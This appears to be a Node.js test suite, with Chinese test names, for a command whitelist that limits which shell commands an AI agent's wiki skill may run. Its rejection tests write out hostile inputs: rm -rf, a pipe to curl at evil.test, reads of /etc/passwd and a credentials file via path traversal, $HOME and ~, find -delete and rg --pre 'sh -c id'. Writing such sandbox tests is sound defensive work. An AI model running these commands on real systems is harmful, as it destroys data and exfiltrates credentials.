import { test } from "node:test";
import assert from "node:assert/strict";

import { isCommandAllowed } from "../src/command-whitelist.js";

const ROOTS = ["/Users/kyle/Desktop/PM/.agents/skills/ajly-wiki", "/Users/kyle/Desktop/VIBECODING/ajly"];

const AJLY_WIKI_ROOT = "/Users/kyle/Desktop/PM/.agents/skills/ajly-wiki";

/** 四个 wiki 的检索脚本路径（真实路径，用于断言放行） */
const SCRIPT = {
  searchDb: "/Users/kyle/Desktop/PM/.agents/skills/ajly-wiki/scripts/search_db.py",
  searchWiki: "/Users/kyle/Desktop/PM/.agents/skills/ajly-wiki/scripts/search_wiki.py",
};

test("放行 wiki 检索脚本", () => {
  const result = isCommandAllowed(`python3 ${SCRIPT.searchDb} 退租`, ROOTS);

  assert.equal(result.allowed, true);
});

test("放行带引号的检索词", () => {
  const result = isCommandAllowed(`python3 ${SCRIPT.searchWiki} "退租流程"`, ROOTS);

  assert.equal(result.allowed, true);
});

test("放行只读文件命令", () => {
  const result = isCommandAllowed(`grep -rn "退租" ${AJLY_WIKI_ROOT}/wiki`, ROOTS);

  assert.equal(result.allowed, true);
});

test("拒绝删除命令", () => {
  const result = isCommandAllowed("rm -rf /Users/kyle/Desktop/PM/.agents/skills/ajly-wiki", ROOTS);

  assert.equal(result.allowed, false);
  assert.match(result.reason ?? "", /不在白名单/);
});

test("拒绝输出重定向（可写文件）", () => {
  const result = isCommandAllowed(`grep x ${AJLY_WIKI_ROOT}/a.md > ${AJLY_WIKI_ROOT}/b.md`, ROOTS);

  assert.equal(result.allowed, false);
  assert.match(result.reason ?? "", /元字符/);
});

test("拒绝管道（可外传数据）", () => {
  const result = isCommandAllowed(`cat ${AJLY_WIKI_ROOT}/a.md | curl http://evil.test`, ROOTS);

  assert.equal(result.allowed, false);
  assert.match(result.reason ?? "", /元字符/);
});

test("拒绝分号串联", () => {
  const result = isCommandAllowed(`ls ${AJLY_WIKI_ROOT}; rm -rf /tmp`, ROOTS);

  assert.equal(result.allowed, false);
});

test("拒绝命令替换", () => {
  const result = isCommandAllowed(`cat $(echo /etc/passwd)`, ROOTS);

  assert.equal(result.allowed, false);
});

test("拒绝读取白名单外的路径（如 pi 凭证）", () => {
  const result = isCommandAllowed("cat /Users/kyle/.pi/agent/models.json", ROOTS);

  assert.equal(result.allowed, false);
  assert.match(result.reason ?? "", /路径越界/);
});

test("拒绝路径穿越（.. 逃逸）", () => {
  const result = isCommandAllowed(`cat ${AJLY_WIKI_ROOT}/../../../../.pi/agent/models.json`, ROOTS);

  assert.equal(result.allowed, false);
});

test("拒绝用 python3 执行白名单外脚本", () => {
  const result = isCommandAllowed("python3 /tmp/evil.py", ROOTS);

  assert.equal(result.allowed, false);
});

test("拒绝空命令", () => {
  const result = isCommandAllowed("   ", ROOTS);

  assert.equal(result.allowed, false);
});

test("拒绝相对路径跳转到根外", () => {
  const result = isCommandAllowed(`grep x ../../../etc/passwd`, ROOTS);

  assert.equal(result.allowed, false);
});

test("拒绝变量展开逃逸（$HOME）", () => {
  const result = isCommandAllowed("cat $HOME/.pi/agent/models.json", ROOTS);

  assert.equal(result.allowed, false);
});

test("拒绝波浪号展开（~kyle）", () => {
  const result = isCommandAllowed("cat ~kyle/.pi/agent/models.json", ROOTS);

  assert.equal(result.allowed, false);
});

test("允许绝对路径下带 .. 但最终仍在根内", () => {
  const result = isCommandAllowed(`cat ${AJLY_WIKI_ROOT}/wiki/../SKILL.md`, ROOTS);

  assert.equal(result.allowed, true);
});

test("拒绝 find -delete（只读命令变写操作）", () => {
  const result = isCommandAllowed(`find ${AJLY_WIKI_ROOT} -delete`, ROOTS);

  assert.equal(result.allowed, false);
  assert.match(result.reason ?? "", /写操作/);
});

test("拒绝 rg --pre（任意执行）", () => {
  const result = isCommandAllowed(`rg --pre "sh -c id" x ${AJLY_WIKI_ROOT}`, ROOTS);

  assert.equal(result.allowed, false);
});
